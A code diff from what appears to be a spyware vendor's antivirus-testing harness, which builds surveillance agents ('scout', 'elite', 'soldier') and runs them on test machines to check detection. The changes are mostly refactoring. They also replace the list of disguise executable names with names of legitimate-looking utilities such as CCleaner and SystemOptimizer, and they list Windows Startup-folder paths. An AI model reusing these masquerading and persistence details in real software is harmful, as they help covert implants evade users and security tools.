@@ -24,6 +24,7 @@ from AVCommon.logger import logging
 from AVCommon import process
 from AVCommon import helper
 from AVCommon import build_common
+from AVCommon import utils
 
 MOUSEEVENTF_MOVE = 0x0001  # mouse move
 MOUSEEVENTF_ABSOLUTE = 0x8000  # absolute move
@@ -34,21 +35,15 @@ MOUSEEVENTF_LEFTUP = 0x0004  # left button up
 MOUSEEVENTF_CLICK = MOUSEEVENTF_LEFTDOWN + MOUSEEVENTF_LEFTUP
 
 #names = ['BTHSAmpPalService','CyCpIo','CyHidWin','iSCTsysTray','quickset','agent']
-names = ['btplayerctrl', 'HydraDM', 'iFrmewrk', 'Toaster', 'rusb3mon', 'SynTPEnh', 'agent']
+#names = ['btplayerctrl', 'HydraDM', 'iFrmewrk', 'Toaster', 'rusb3mon', 'SynTPEnh', 'agent']
+names = ['8169Diag', 'CCleaner', 'Linkman', 'PCSwift', 'PerfTune', 'SystemOptimizer', 'agent']
 
 start_dirs = ['C:/Users/avtest/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup',
             'C:/Documents and Settings/avtest/Start Menu/Programs/Startup', 'C:/Users/avtest/Desktop']
 
 
 def unzip(filename, fdir):
-    zfile = zipfile.ZipFile(filename)
-    names = []
-    for name in zfile.namelist():
-        (dirname, filename) = os.path.split(name)
-        logging.debug("- Decompress: %s / %s" % (fdir, filename))
-        zfile.extract(name, fdir)
-        names.append('%s/%s' % (fdir, name))
-    return names
+    return utils.unzip(filename, fdir, logging.debug)
 
 
 def check_static(files, report = None):
@@ -143,7 +138,7 @@ def get_target_name():
 class AgentBuild:
     def __init__(self, backend, frontend=None, platform='windows', kind='silent',
                  ftype='desktop', blacklist=[], soldierlist=[], param=None,
-                 puppet="puppet", asset_dir="AVAgent/assets", factory=None, build_srv=False):
+                 puppet="puppet", asset_dir="AVAgent/assets", factory=None, server_side=False):
         self.kind = kind
         self.host = (backend, frontend)
 
@@ -157,7 +152,7 @@ class AgentBuild:
         self.ftype = ftype
         self.param = param
         self.factory = factory
-        self.build_srv = build_srv
+        self.server_side = server_side
 
         logging.debug("DBG blacklist: %s" % self.blacklist)
         logging.debug("DBG soldierlist: %s" % self.soldierlist)
@@ -509,9 +504,12 @@ class AgentBuild:
         """ build and execute the  """
         factory_id, ident, exe = self.execute_pull()
 
-        new_exe = "build\\scout.exe"
+        # TODO: e' davvero inutile, no?
+        # new_exe = "build\\scout.exe"
+        #
+        # shutil.copy(exe, new_exe)
+
         logging.debug("execute_scout: %s" % exe)
-        shutil.copy(exe[0], new_exe)
 
         self._execute_build(exe)
         if self.kind == "melt": # and not exploit
@@ -584,9 +582,8 @@ class AgentBuild:
             os.mkdir('build/%s' % self.platform)
 
         #creates the factory
-
-        target_id, factory_id, ident = build_common.create_new_factory(
-            operation, target, factory, config)
+        #                                           create_new_factory(ftype, frontend, backend, operation, target, factory, config)
+        target_id, factory_id, ident = build_common.create_new_factory(self.ftype, self.host[1], self.host[0], operation, target, factory, config)
 
         build_common.connection.rcs=(target_id, factory_id, ident, operation, target, factory)
 
@@ -595,7 +592,7 @@ class AgentBuild:
         meltfile = self.param.get('meltfile', None)
 
         zipfilename = 'build/%s/build.zip' % self.platform
-        build_common.build_agent(factory_id, add_result, zipfilename, melt=meltfile, kind=self.kind)
+        build_common.build_agent(factory_id, self.hostname, self.param, add_result, zipfilename, melt=meltfile, kind=self.kind)
         return factory_id, ident, zipfilename
 
     def _execute_extraction_and_static_check(self, zipfilename):
@@ -615,12 +612,17 @@ class AgentBuild:
 
     def execute_pull(self):
         """ build and execute the  """
-        if self.build_srv:
-            factory_id, ident, zipfilename = self.factory
+        if self.server_side:
+            # logging.debug("factory = %s" % self.factory)
+            target_id, factory_id, ident = self.factory
+            # TODO: il file per ora e' cablato per il caso server side
+            exe = "C:\\AVTest\\AVAgent\\buildsrv.exe"
         else:
             factory_id, ident, zipfilename = self.execute_pull_server()
+            exe = self._execute_extraction_and_static_check(zipfilename)
 
-        return factory_id, ident, filenames
+        return factory_id, ident, exe
+
 
 
     def execute_web_expl(self, websrv):
@@ -671,7 +673,7 @@ def execute_agent(args, level, platform):
     logging.debug("DBG ftype: %s" % ftype)
 
     vmavtest = AgentBuild(args.backend, args.frontend,
-                          platform, args.kind, ftype, args.blacklist, args.soldierlist, args.param, args.puppet, args.asset_dir, args.factory, args.build_srv)
+                          platform, args.kind, ftype, args.blacklist, args.soldierlist, args.param, args.puppet, args.asset_dir, args.factory, args.server_side)
 
     """ starts a scout """
     if socket.gethostname().lower() not in args.nointernetcheck:
@@ -697,12 +699,12 @@ def execute_agent(args, level, platform):
                       "pull": vmavtest.execute_pull, "pull_server": vmavtest.execute_pull_server, "elite_fast": vmavtest.execute_elite_fast,
                       "soldier_fast": vmavtest.execute_soldier_fast, "soldier": vmavtest.execute_soldier }
             sleep(5)
-            factory_id, ident, filename = action[level]()
+            action[level]()
 
         else:
             add_result("+ ERROR USER CREATE")
 
-    return True, filename
+    return True
 
 def get_instance(client, imei=None):
     print 'passed imei to get_isntance ', imei
@@ -842,7 +844,7 @@ def build(args, report):
     try:
         #check_blacklist(blacklist)
         if action in ["pull", "scout", "elite", "elite_fast", "soldier", "soldier_fast"]:
-            result, filename = execute_agent(args, action, args.platform)
+            success_ret = execute_agent(args, action, args.platform)
         elif action == "clean":
             clean(args.backend)
         else:
@@ -857,7 +859,7 @@ def build(args, report):
     if report_send:
         report_send("+ END %s %s" % (action, success))
 
-    return results, success, errors, filename
+    return results, success, errors
 
 
 def main():
